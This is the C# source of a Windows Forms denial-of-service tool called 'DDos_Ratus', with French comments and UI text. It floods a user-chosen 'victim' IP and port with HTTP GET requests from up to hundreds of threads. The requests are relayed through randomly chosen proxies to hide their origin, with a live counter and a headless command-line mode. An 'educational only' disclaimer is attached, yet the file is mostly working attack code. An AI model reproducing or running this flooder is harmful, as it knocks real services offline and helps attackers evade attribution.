using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DDos_Ratus
{
    public partial class Form1 : Form
    {

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool AllocConsole(); // Importe la méthode AllocConsole

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool FreeConsole(); // Importe la méthode FreeCons

        private static List<Thread> threads = new List<Thread>();
        private string targetIP = string.Empty;
        private int targetPort = 0;
        private int numThreads = 0;
        private int requestsPerSecond = 0;
        private bool profile = true;
        private static int requestsCounter = 0;
        private static int dropCounter = 0;
        private static bool run_thread = false;
        private static object lockObject = new object();
        private static Random random = new Random();
        public static List<(string IP, int Port)> proxyList = new List<(string IP, int Port)>()
        {
           
        };

        public Form1()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.FixedSingle; // Rendre la fenêtre non redimensionnable
            this.MaximizeBox = false; // Désactiver le bouton d'agrandissement

            string[] args = Environment.GetCommandLineArgs();

            if (args.Length >= 6)
            {
                targetIP = args[1];
                targetPort = int.Parse(args[2]);
                numThreads = int.Parse(args[3]);
                requestsPerSecond = int.Parse(args[4]);
                profile = bool.Parse(args[5]);

                if (!profile)
                {
                    Console.WriteLine("<!><!> Ce programme est UNIQUEMENT à titre éducatif. L'utilisateur est pleinement conscient et informé du titre éducatif de ce programme. <!><!>");
                    AllocConsole();

                    if (IPAddress.TryParse(targetIP, out IPAddress ipAddress))
                    {
                        run_thread = true;

                        Initialise(targetIP, targetPort, numThreads, requestsPerSecond, false); ;

                        // Start a new thread to display the requests per second
                        Thread displayThread = new Thread(DisplayRequestsPerSecondConsole);
                        displayThread.Start();

                        // Wait until the user presses a key to stop the program
                        Console.WriteLine("Appuyez sur une touche pour arrêter le programme...");
                        Console.ReadKey();

                        // Stop the threads and exit the program
                        run_thread = false;
                        foreach (Thread thread in threads)
                        {
                            thread.Join();
                        }
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("[-] Erreur : Veuillez saisir une adresse IP valide.");
                    }
                }
            }

            Disclamer disclamer = new Disclamer();
            disclamer.ShowDialog();

            if (disclamer.DialogResult != DialogResult.OK)
            {
                Close();
                Application.Exit();
            }

            this.FormClosing += couille;
        }

        private void couille(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (profile)
            {
                EnFome();
            }
        }

        static void Initialise(string targetIP, int targetPort, int numThreads, int requestsPerSecond, bool proxybool)
        {
            int numRequests = 0;
            double interval = 1000.0 / requestsPerSecond;
           
            

            for (int i = 0; i < numThreads && run_thread; i++)
            {
                Thread thread = new Thread(() => LaunchAttack(targetIP, targetPort, numRequests, interval, proxybool));
                threads.Add(thread);
                thread.Start();
            }
        }

        private void EnFome()
        {
            textBox1.Text = targetIP;
            numericUpDown1.Value = targetPort;
            numericUpDown2.Value = numThreads;
            numericUpDown3.Value = requestsPerSecond;
        }

        static void LaunchAttack(string targetIP, int targetPort, int numRequests, double interval, bool proxybool)
        {
            Stopwatch stopwatch = Stopwatch.StartNew();

            while (run_thread)
            {
               
               
                try
                {   
                    var proxy = GetRandomProxy();
                    using (var client = new TcpClient())
                    {
                        if (proxybool)
                        {
                            client.Connect(proxy.IP, proxy.Port);
                            using (var stream = client.GetStream())
                            {
                                // Send the request here
                                byte[] request = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\nHost: " + targetIP + ":"+targetPort+"\r\nConnection: close\r\n\r\n");
                                stream.Write(request, 0, request.Length);
                            }
                        }

                        else
                        {

                        }
                        
                    }
                }
                catch (Exception)
                {
                    // Ignore any exceptions that occur
                }

                numRequests++;

                double elapsedMilliseconds = stopwatch.Elapsed.TotalMilliseconds;
                double remainingTime = interval - elapsedMilliseconds;

                if (remainingTime > 0)
                    Thread.Sleep((int)remainingTime);
                else
                    Thread.Yield();

                stopwatch.Restart();

                // Increase the requests counter
                Interlocked.Increment(ref requestsCounter);
            }
        }

        private static (string IP, int Port) GetRandomProxy()
        {
            lock (lockObject)
            {
                int index = random.Next(0, proxyList.Count);
                return proxyList[index];
            }
        }

        private void button1_Click(Object sender, EventArgs e)
        {

            if (!run_thread)
            {
                if (IPAddress.TryParse(textBox1.Text, out IPAddress ipAddress))
                {
                    run_thread = true;

                    targetIP = ipAddress.ToString();
                    targetPort = (int)numericUpDown1.Value;
                    numThreads = (int)numericUpDown2.Value;
                    requestsPerSecond = (int)numericUpDown3.Value;
                    bool checkproxy = false;
                    if (checkBox1.Checked)
                    {
                        checkproxy = true;
                    }
                    Initialise(targetIP, targetPort, numThreads, requestsPerSecond, checkproxy);
                    EnFormeConsole();
                    // Start a new thread to display the requests per second
                    Thread displayThread = new Thread(DisplayRequestsPerSecond);
                    displayThread.Start();
                    button1.Text = "Kill logiciel";
                }
                else
                {
                    MessageBox.Show("Veuillez saisir une adresse IP valide.", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                run_thread = false;
                Environment.Exit(0);
            }
        }

        private void DisplayRequestsPerSecond()
        {
            while (true)
            {
                int currentRequests = Interlocked.Exchange(ref requestsCounter, 0);

                // Utilisez Invoke pour mettre à jour le label sur le thread de l'interface utilisateur
                label9.Invoke((MethodInvoker)(() =>
                {
                    label9.Text = "[+] Requêtes " + currentRequests.ToString() + " /Sec";
                }));

                Console.WriteLine("[+] Requêtes: " + currentRequests.ToString() + " /Sec");

                Thread.Sleep(1000); // Refresh every second
            }
        }

        private void DisplayRequestsPerSecondConsole()
        {
            while (true)
            {
                int currentRequests = Interlocked.Exchange(ref requestsCounter, 0);
                Console.WriteLine("[+] Requêtes: " + currentRequests.ToString() + " /Sec");
                Thread.Sleep(1000); // Refresh every second
            }
        }

        private void EnFormeConsole()
        {
            label9.ForeColor = Color.Green;
            label9.BackColor = Color.Transparent;
            label10.ForeColor = Color.Green;
            label10.BackColor = Color.Transparent;
            label10.Invoke((MethodInvoker)(() => { label10.Text = "[+] Exploit Lancé..."; label10.Visible = true; }));
            label9.Invoke((MethodInvoker)(() => { label9.Visible = true; }));
            label12.Invoke((MethodInvoker)(() => { label12.Visible = false; }));
            Console.WriteLine("[+] Exploit Lancé...");
        }

        private void label8_Click(object sender, EventArgs e)
        {
        }

        private void label11_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Renseignez les différentes textes box.\nIP de la victime : 00.000.000.00\nPort : xxxx\nThreads : Max ~= 500\nRequêtes : Max ~= 600\n\n\n<!><!>[!] Nombre de drop(s) de requêtes : Erreur cumulée reçue en retour des requêtes. \nCela peut être dû à la connexion DDOS de la victime ou à un pare-feu activé.\nNotez qu'il est possible qu'un processus bride ses propres requêtes.", "Aide", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            nmap_cmd nmap_Cmd = new nmap_cmd();
            nmap_Cmd.ShowDialog();
        }


        public void Formprox()
        {
            if(checkBox1.Checked)
            {
                checkBox2.Enabled = true;
                if (checkBox2.Checked)
                {
                    Gen_Button.Enabled = false;
                    label15.Enabled = false;
                    label16.Enabled = true;
                    label17.Enabled = true;
                    List_Button.Enabled = true;
                    Load_Button.Enabled = true;
                    ProxPath_Textbox.Enabled = true;
                }
                else
                {
                    Gen_Button.Enabled = true;
                    label15.Enabled = true;
                    label16.Enabled = true;
                    label17.Enabled = false;
                    List_Button.Enabled = true;
                    Load_Button.Enabled = false;
                    ProxPath_Textbox.Enabled = false;
                }
            }
            else
            {
                checkBox2.Enabled = false;
                Gen_Button.Enabled = false;
                List_Button.Enabled = false;
                Load_Button.Enabled = false;
                ProxPath_Textbox.Enabled = false;

                label15.Enabled = false;
                label16.Enabled = false;
                label17.Enabled = false;
                
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            Formprox();
        }

        private void Gen_Button_Click(object sender, EventArgs e)
        {
            ccproxyAsync();
        }

        private void List_Button_Click(object sender, EventArgs e)
        {
            ProxyViewer.NewWindowsProxy(proxyList);
        }

        private void Load_Button_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Fichiers texte (*.txt)|*.txt";
            openFileDialog.Title = "Sélectionner un fichier de wordlist de Proxy";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = openFileDialog.FileName;
                ProxPath_Textbox.Text= filePath;
                // Utilisez le chemin du fichier sélectionné comme vous le souhaitez (par exemple, appelez la fonction LoadProxyListFromFile)
                ProxyFinder.LoadProxyListFromFile(filePath);
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            Formprox();
        }
        private async Task ccproxyAsync()
        {
            await ProxyFinder.FindProxiesAsync();
        }
    }
}
